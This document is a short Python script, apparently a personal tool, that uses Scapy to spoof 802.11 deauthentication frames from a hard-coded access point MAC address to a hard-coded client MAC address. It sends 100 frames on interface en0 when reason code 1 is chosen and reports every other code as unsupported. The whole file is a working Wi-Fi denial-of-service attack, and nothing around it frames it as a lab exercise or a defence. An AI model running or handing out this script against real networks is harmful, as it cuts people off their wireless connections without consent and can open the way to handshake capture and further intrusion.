#! /usr/bin/env python

from scapy.all import * 
#a=sniff(count=10) 
#a.nsummary()

reasonCode = input("Enter reason code:\n1 - Unspecified\n4 - Disassociated due to inactivity\n5 - Disassociated because AP is unable to handle all currently associated stations\n8 - Deauthenticated because sending STA is leaving BSS\n")
print(reasonCode)

if reasonCode == '1':
    target_mac = "f0:18:98:2d:5f:c6"
    gateway_mac = "DC:A5:F4:60:C9:70"
    # 802.11 frame
    # addr1: destination MAC
    # addr2: source MAC
    # addr3: Access Point MAC
    dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
    # stack them up
    packet = RadioTap()/dot11/Dot11Deauth(reason=1)
    # send the packet
    sendp(packet, inter=0.1, count=100, iface="en0", verbose=1)
elif reasonCode == '4':
    print('Unsupported reason code')
elif reasonCode == '5':
    print('Unsupported reason code')
elif reasonCode == '8':
    print('Unsupported reason code')
else:
    print('Unsupported reason code')